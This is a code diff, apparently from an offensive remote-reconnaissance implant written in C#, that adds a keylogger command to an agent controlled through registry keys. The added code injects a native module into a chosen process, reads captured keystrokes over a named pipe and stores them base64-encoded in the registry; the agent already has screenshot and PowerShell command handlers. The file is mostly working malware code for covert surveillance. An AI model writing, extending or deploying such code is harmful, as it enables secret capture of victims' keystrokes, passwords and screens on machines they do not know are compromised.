@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Text;
-using System.Reflection;
 using Microsoft.Win32;
 using System.Security.Principal;
 using System.IO;
@@ -37,6 +36,7 @@ namespace RemoteReconCore
                 System.Environment.Exit(0); /*Exit because we couldn't open the basekey*/
 
             modkey = runkey;
+            kkey = keylogkey;
             while (rrbase.GetValue(runkey) != null)
             {
                 //main loop
@@ -99,6 +99,17 @@ namespace RemoteReconCore
                         command = new KeyValuePair<int, object>(0, "");
                         result = new KeyValuePair<int, object>(0, "");
                         break;
+                    case (int)Cmd.Keylog:
+#if DEBUG
+                        Console.WriteLine("Writing keylog command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, object>(0, "");
+                        break;
                     default:
                         break;
                 }
@@ -122,6 +133,11 @@ namespace RemoteReconCore
 #endif
                 mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                 GetScreenShot(Convert.ToInt32(command.Value));
+            }
+            else if ((int)Cmd.Keylog == command.Key)
+            {
+                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
+                LogKeystrokes(Convert.ToInt32(command.Value));
             }
             else if ((int)Cmd.PowerShell == command.Key)
             {
@@ -155,8 +171,11 @@ namespace RemoteReconCore
         //private string exceptionInfo;
         private byte[] mod;
         public static string modkey;
+        public static string kkey;
         public static KeyValuePair<int, object> command;
         public static KeyValuePair<int, object> result;
+        private bool kl = false;
+        private Thread keylogThread;
         RegistryKey rrbase;
 
         public enum Result : int
@@ -239,13 +258,81 @@ namespace RemoteReconCore
             }
         }
 
+        private  void LogKeystrokes(int pid)
+        {
+            //Function that will inject the remote recon module into a process and wait for keystrokes.
+
+            byte[] keylogMod = PatchRemoteReconNative("keylog");
+            Injector keylogger = new Injector(pid, keylogMod);
+
+#if DEBUG
+            Console.WriteLine("Created keylog object");
+#endif
+            if (!keylogger.Inject())
+                result = new KeyValuePair<int, object>(3, "Recon module injection failed");
+            else
+            {
+#if DEBUG
+                Console.WriteLine("Starting background thread to record keystrokes");
+#endif
+                keylogThread = new Thread(() =>
+                {
+                    KeylogSync();
+                });
+
+                keylogThread.IsBackground = true;
+                keylogThread.Start();
+#if DEBUG
+                Console.WriteLine("Started keylogger successfully");
+#endif
+                result = new KeyValuePair<int, object>(0, "Keylogger started");
+            }
+        }
+
+        private void KeylogSync()
+        {
+            NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.InOut);
+            kl = true;
+            try
+            {
+
+                client.Connect();
+#if DEBUG
+                Console.WriteLine("Connected to named pipe server");
+#endif
+                StreamReader reader = new StreamReader(client);
+                while (kl)
+                {
+#if DEBUG 
+                    Console.WriteLine("At the top of the loop");
+#endif
+                    //main loop to take keylog ouput and place into the registry
+                    string currVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)rrbase.GetValue(kkey)));
+                    string newVal = reader.ReadToEnd();
+                    currVal = currVal + newVal;
+                    string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(currVal));
+                    rrbase.SetValue(kkey, enc, RegistryValueKind.String);
+                    Thread.Sleep(1000 * sleep);
+                }
+
+                client.Close();
+                client.Dispose();
+            }
+            catch (Exception e)
+            {
+                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
+                rrbase.SetValue(kkey, msg, RegistryValueKind.String);
+            }
+            
+            
+        }
+
         private void GetScreenShot(int pid)
         {
             string image = "";
-            //Function for connecting to the remoting server and obtaining the screenshot
             //Inject the recon module into the target process.
-            byte[] patchedMod = PatchRemoteReconNative("screenshot");
-            Injector screenshot = new Injector(pid, patchedMod);
+            byte[] screenshotMod = PatchRemoteReconNative("screenshot");
+            Injector screenshot = new Injector(pid, screenshotMod);
             
 #if DEBUG
             Console.WriteLine("Created screenshot object");
@@ -278,7 +365,6 @@ namespace RemoteReconCore
                 {
 #if DEBUG
                     Console.WriteLine("Connect to namedpipe failed");
-                    File.AppendAllText("c:\\agent.log", "Connect to named pipe failed\n");
 #endif
                     result = new KeyValuePair<int, object>(2, e.ToString());
                 }
